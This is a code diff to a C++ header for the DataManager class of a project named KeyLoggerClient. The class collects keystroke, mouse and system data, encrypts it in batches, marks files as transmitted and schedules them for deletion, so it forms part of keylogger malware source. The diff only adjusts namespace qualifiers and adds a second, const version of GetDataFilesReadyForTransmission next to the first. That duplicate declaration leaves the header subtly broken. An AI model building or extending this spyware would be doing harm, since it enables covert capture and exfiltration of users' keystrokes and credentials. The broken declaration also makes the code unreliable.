@@ -1,3 +1,4 @@
+// KeyLoggerClient/include/data/DataManager.h
 #ifndef DATAMANAGER_H
 #define DATAMANAGER_H
 
@@ -69,7 +70,7 @@ public:
     
     void AddKeyData(const KeyData& keyData);
     void AddMouseData(const MouseData& mouseData);
-    void AddSystemData(const SystemInfo& systemInfo);
+    void AddSystemData(const utils::SystemInfo& systemInfo);
     void AddSystemEventData(const SystemEventData& eventData);
     
     std::vector<uint8_t> RetrieveEncryptedData();
@@ -106,14 +107,16 @@ private:
     void AppendToFile(const std::string& path, const std::string& data);
     void RotateDataFileIfNeeded();
     void RotateDataFile();
-    
+
     std::vector<std::string> GetDataFilesReadyForTransmission();
+
+    std::vector<std::string> GetDataFilesReadyForTransmission() const;
     void MarkFileAsTransmitted(const std::string& filePath);
     void ScheduleFileDeletion(const std::string& filePath, uint64_t delayMs);
     
     static std::string KeyDataToString(const KeyData& data);
     static std::string MouseDataToString(const MouseData& data);
-    static std::string SystemInfoToString(const SystemInfo& info);
+    static std::string SystemInfoToString(const utils::SystemInfo& info);
     std::string SystemEventToString(const SystemEventData& event) const;
     std::string GenerateBatchId() const;
 };
